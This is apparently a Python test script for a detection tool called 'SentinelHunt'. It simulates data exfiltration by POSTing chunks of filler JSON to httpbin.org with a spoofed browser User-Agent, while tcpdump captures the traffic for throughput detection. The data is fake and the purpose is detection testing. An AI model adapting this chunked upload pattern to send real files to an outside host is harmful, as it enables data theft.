#!/usr/bin/env python3
"""
Data Exfiltration Simulation

Purpose:
- Simulate large-scale data exfiltration
- High throughput, large byte transfers
- Should trigger high bytes_per_second detection

Technique:
- Large file uploads via HTTP POST
- High-volume data transfer
- Sustained traffic over time

Run from: WSL or Kali Linux
"""

import time
import random
import subprocess
from datetime import datetime
import http.client
import json

# ========================================
# CONFIGURATION
# ========================================
TARGET_SERVER = "httpbin.org"  # Public testing server
TARGET_PORT = 443
EXFIL_SIZE_MB = 10  # Size of data to exfiltrate
CHUNK_SIZE_KB = 256  # Size per request
PCAP_OUTPUT = f"exfiltration_attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"

print("=" * 60)
print("  SENTINELHUNT DATA EXFILTRATION SIMULATION")
print("=" * 60)
print(f"[+] Target: {TARGET_SERVER}:{TARGET_PORT}")
print(f"[+] Exfiltration Size: {EXFIL_SIZE_MB} MB")
print(f"[+] Chunk Size: {CHUNK_SIZE_KB} KB")
print(f"[+] PCAP Output: {PCAP_OUTPUT}")
print("")

# ========================================
# START PACKET CAPTURE
# ========================================
print("[+] Starting packet capture...")
try:
    tcpdump_process = subprocess.Popen(
        ['sudo', 'tcpdump', '-i', 'any', '-w', PCAP_OUTPUT, f'host {TARGET_SERVER}'],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    time.sleep(2)
    print("[+] Packet capture started")
except Exception as e:
    print(f"[!] Failed to start tcpdump: {e}")
    tcpdump_process = None

# ========================================
# GENERATE FAKE SENSITIVE DATA
# ========================================
def generate_fake_data(size_kb):
    """Generate fake sensitive data"""
    # Simulate database dump, file contents, etc.
    data = {
        "type": "exfiltrated_data",
        "timestamp": datetime.now().isoformat(),
        "payload": "A" * (size_kb * 1024 - 200)  # Fill with data
    }
    return json.dumps(data).encode()

# ========================================
# EXFILTRATE DATA
# ========================================
print("\n[+] Starting data exfiltration...\n")

total_chunks = (EXFIL_SIZE_MB * 1024) // CHUNK_SIZE_KB
bytes_sent = 0
start_time = time.time()

try:
    for chunk_num in range(total_chunks):
        # Generate chunk
        chunk_data = generate_fake_data(CHUNK_SIZE_KB)
        
        try:
            # Send via HTTP POST (simulating data upload)
            conn = http.client.HTTPSConnection(TARGET_SERVER, timeout=10)
            
            headers = {
                'Content-Type': 'application/octet-stream',
                'User-Agent': 'Mozilla/5.0'
            }
            
            conn.request("POST", "/post", chunk_data, headers)
            response = conn.getresponse()
            conn.close()
            
            bytes_sent += len(chunk_data)
            
            # Progress
            progress = (chunk_num + 1) / total_chunks * 100
            elapsed = time.time() - start_time
            rate_mbps = (bytes_sent / 1024 / 1024) / elapsed if elapsed > 0 else 0
            
            print(f"\r[{elapsed:5.1f}s] Progress: {progress:5.1f}% | Sent: {bytes_sent/1024/1024:.2f} MB | Rate: {rate_mbps:.2f} MB/s", 
                  end='', flush=True)
            
            # Small delay to avoid rate limiting
            time.sleep(0.1)
            
        except Exception as e:
            print(f"\n[!] Chunk {chunk_num} failed: {e}")
            continue

except KeyboardInterrupt:
    print("\n\n[!] Exfiltration interrupted by user")

# ========================================
# STOP PACKET CAPTURE
# ========================================
print("\n\n[+] Stopping exfiltration...")
time.sleep(2)

if tcpdump_process:
    print("[+] Stopping packet capture...")
    tcpdump_process.terminate()
    tcpdump_process.wait()

# ========================================
# SUMMARY
# ========================================
elapsed_time = time.time() - start_time
avg_rate_mbps = (bytes_sent / 1024 / 1024) / elapsed_time if elapsed_time > 0 else 0

print("\n" + "=" * 60)
print("  EXFILTRATION COMPLETE")
print("=" * 60)
print(f"[+] Total data sent: {bytes_sent / 1024 / 1024:.2f} MB")
print(f"[+] Duration: {elapsed_time:.1f} seconds")
print(f"[+] Average rate: {avg_rate_mbps:.2f} MB/s")
print(f"[+] Chunks sent: {chunk_num + 1}/{total_chunks}")
print(f"[+] PCAP file: {PCAP_OUTPUT}")
print("")
print("Expected detections:")
print("  ✓ High bytes_per_second")
print("  ✓ Large total_bytes")
print("  ✓ Sustained high-volume traffic")
print("  ✓ Anomalous data transfer pattern")
print("")
print("Next steps:")
print("  1. Transfer PCAP to SentinelHunt")
print("  2. Run feature extraction")
print("  3. Verify high throughput detection")
print("=" * 60)
